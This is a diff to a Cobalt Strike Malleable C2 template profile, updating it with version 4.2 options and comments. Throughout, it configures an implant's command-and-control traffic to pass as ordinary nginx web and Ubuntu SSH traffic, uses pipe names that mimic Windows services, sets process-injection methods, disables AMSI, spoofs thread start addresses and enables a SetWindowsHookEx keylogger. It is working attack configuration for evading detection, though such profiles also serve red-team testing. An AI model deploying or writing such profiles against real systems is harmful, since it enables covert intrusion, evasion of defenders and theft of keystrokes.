@@ -1,4 +1,4 @@
-#template profile - updated with 4.x options, added sections for new variant options. Variants can be used on http-get, http-post, http-stager, and https-certificate blocks.
+#template profile - updated with 4.2 options.
 #options from https://www.cobaltstrike.com/help-malleable-c2 and https://www.cobaltstrike.com/help-malleable-postex
 #attempt to get everything in one place with examples.
 #xx0hcd
@@ -13,7 +13,7 @@ set jitter    "33";
 set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/587.38 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
 
 #set true to use staged payloads, false to disable staged payloads.
-#set host_stage "false";
+set host_stage "false";
 
 ###DNS options###
 set dns_idle "8.8.8.8";
@@ -26,16 +26,17 @@ set dns_ttl "1";
 
 ###SMB options###
 #use different strings for pipename and pipename_stager.
-set pipename "ntsvcs";
-set pipename_stager "scerpc";
+set pipename "ntsvcs##";
+set pipename_stager "scerpc##";
 set smb_frame_header "";
 
 ###TCP options###
 set tcp_port "8000";
 set tcp_frame_header "";
 
-###SSH Banner###
+###SSH options###
 set ssh_banner "Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-1065-aws x86_64)";
+set ssh_pipename "SearchTextHarvester##";
 
 ###SSL Options###
 #custom cert
@@ -75,9 +76,9 @@ https-certificate {
 
 ###HTTP-Config Block###
 #Order of server response headers. Or you can just fill them in manually under the server blocks.
+#c2lint msg -> .http-config should not set header 'Content-Type'. Let the web server set the value for this field.
 http-config {
     set headers "Server, Content-Type, Cache-Control, Connection";
-    header "Content-Type" "text/html;charset=UTF-8";
     header "Connection" "close";
     header "Cache-Control" "max-age=2";
     header "Server" "nginx";
@@ -145,7 +146,8 @@ http-get {
             #mask;
             	    
 
-#Use prepend and append to mix your data in with normal looking site traffic. Escape double quotes and you can also use '\n'. c2lint shows '\n' as a period, but you can run it through Burp or pcap a HTTP payload to make sure everything is lining up correctly. Prepend strings need to be entered in reverse order, so the first string here is '"<!DOCTYPE html>\n";'.   
+#Use prepend and append to mix your data in with normal looking site traffic. Escape double quotes and you can also use '\n'. c2lint shows '\n' as a period, but you can run it through Burp or pcap a HTTP payload to make sure everything is lining up correctly. Prepend strings need to be entered in reverse order, so the first string here is '"<!DOCTYPE html>\n";'.
+#Havent updated this in awhile, at some point MC2 profiles started displaying copy/paste traffic from Burp 'correctly'. I used to have to play around with spacing, etc. but now usually just copy entire lines in 'prepend' and 'append' terminating correctly.  
 	    prepend "content=";
 	    prepend "<meta name=\"google-site-verification\"\n";
 	    prepend "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n";
@@ -424,6 +426,12 @@ stage {
     
     #https://www.cobaltstrike.com/releasenotes.txt -> + Added option to bootstrap Beacon in-memory without walking kernel32 EAT
     set smartinject "true";
+    
+    #new 4.2. options   
+    #set allocator "HeapAlloc";
+    #set magic_mx_x86 "MZRE";
+    #set magic_mz_x64 "MZAR";
+    #set magic_pe "PE";
 
 #module stomp. Make sure the dll you use is bigger than your payload and test it with post exploit options to make sure everything is working.
 
@@ -499,6 +507,7 @@ process-inject {
         CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
 
         #uses an RWX stub, fires SYSMON 8 events, does allow x86->x64 injection.
+        #c2lint msg -> .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200
         RtlCreateUserThread;
     }
 }
@@ -514,5 +523,10 @@ post-ex {
     set smartinject "true";
 
     set amsi_disable "true";
+    
+    #new 4.2 options
+    set thread_hint "ntdll.dll!RtlUserThreadStart";
+    set pipename "DserNamePipe##";
+    set keylogger "SetWindowsHookEx";
 
 }
